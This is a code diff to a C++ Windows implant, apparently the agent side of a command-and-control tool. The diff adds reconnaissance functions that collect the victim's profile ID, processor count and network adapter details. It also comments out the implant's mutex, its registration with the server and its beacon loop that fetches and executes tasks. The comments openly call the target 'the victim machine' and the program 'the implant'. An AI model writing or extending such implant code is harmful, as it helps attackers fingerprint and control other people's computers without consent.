@@ -1,3 +1,5 @@
+#include <winsock2.h>
+#include <iphlpapi.h>
 #include <windows.h>
 #include <string>
 #include <iostream>
@@ -106,10 +108,60 @@ std::string getWindowsVer() {
 
 }
 
-//find the victim machine's guid
-std::string getGUID() {
-
+//find the victim's profile id
+std::string getProfileID() {
+    std::string buf;
+    buf.resize(BUF_SIZE);
+    std::string name = "WT_PROFILE_ID";
+    GetEnvironmentVariableA(&name[0], &buf[0], DWORD(BUF_SIZE));
+    buf.shrink_to_fit();
+    return buf;
 }
+
+// find number of processors in the victim machine
+std::string getCPUNum() {
+    std::string buf;
+    buf.resize(BUF_SIZE);
+    std::string name = "NUMBER_OF_PROCESSORS";
+    GetEnvironmentVariableA(&name[0], &buf[0], DWORD(BUF_SIZE));
+    buf.shrink_to_fit();
+    return buf;
+}
+
+std::string getNetworkInterfaces() {
+    std::string buf;
+    buf.resize(BUF_SIZE);
+
+    PIP_INTERFACE_INFO pInfo;
+    pInfo = (IP_INTERFACE_INFO *) malloc( sizeof(IP_INTERFACE_INFO) );
+    ULONG ulOutBufLen = 0;
+    DWORD dwRetVal = 0;
+
+    // get the necessary size in the ulOutBufLen variable
+    if ( GetInterfaceInfo(pInfo, &ulOutBufLen) == ERROR_INSUFFICIENT_BUFFER) {
+        free(pInfo);
+        pInfo = (IP_INTERFACE_INFO *) malloc (ulOutBufLen);
+    }
+
+    // GetInterfaceInfo to get the actual data we need
+    if ((dwRetVal = GetInterfaceInfo(pInfo, &ulOutBufLen)) == NO_ERROR ) {
+        printf("\tAdapter Name: %ws\n", pInfo->Adapter[0].Name);
+        printf("\tAdapter Index: %ld\n", pInfo->Adapter[0].Index);
+        printf("\tNum Adapters: %ld\n", pInfo->NumAdapters);
+
+        // free memory allocated
+        free(pInfo);
+        pInfo = NULL;
+    } else if (dwRetVal == ERROR_NO_DATA) {
+        printf("There are no network adapters with IPv4 enabled on the local system\n");
+    } else {
+        //failed to run GetInterfaceInfo
+        return buf;
+    }
+    
+    return buf;
+}
+
 
 // execute the list of commands and send the result back to the server
 void executeCommands(std::vector<std::string> cmds) {
@@ -154,28 +206,31 @@ void getTasksAndExecute() {
 int main(int argc, char* argv[]){
 
     // use a mutex to prevent multiple instances of the implant
-    LPCSTR szUniqueNamedMutex = "magic_conch";
-    HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
-    if( ERROR_ALREADY_EXISTS == GetLastError() )
-    {
-        // Program already running somewhere
-        return 0; // Exit program
-    }
+    // LPCSTR szUniqueNamedMutex = "magic_conch";
+    // HANDLE hHandle = CreateMutexA( NULL, TRUE, szUniqueNamedMutex );
+    // if( ERROR_ALREADY_EXISTS == GetLastError() )
+    // {
+    //     // Program already running somewhere
+    //     return 0; // Exit program
+    // }
 
-    agentId = generateRandomId(10);
-    registerAgent();
+    // agentId = generateRandomId(10);
+    // registerAgent();
 
-    int i = 3;
-    while(i > 0) {
-        std::cout << "wake up" << std::endl;
-        getTasksAndExecute();
-        Sleep(sleepTime);
-        i--;
-    }
+    // int i = 3;
+    // while(i > 0) {
+    //     std::cout << "wake up" << std::endl;
+    //     getTasksAndExecute();
+    //     Sleep(sleepTime);
+    //     i--;
+    // }
 
-    // Upon app closing:
-    ReleaseMutex( hHandle ); // Explicitly release mutex
-    CloseHandle( hHandle ); // close handle before terminating
+    // // Upon app closing:
+    // ReleaseMutex( hHandle ); // Explicitly release mutex
+    // CloseHandle( hHandle ); // close handle before terminating
+
+    // std::cout << getGUID() << std::endl;
+    getNetworkInterfaces();
 
     return 0;
 }
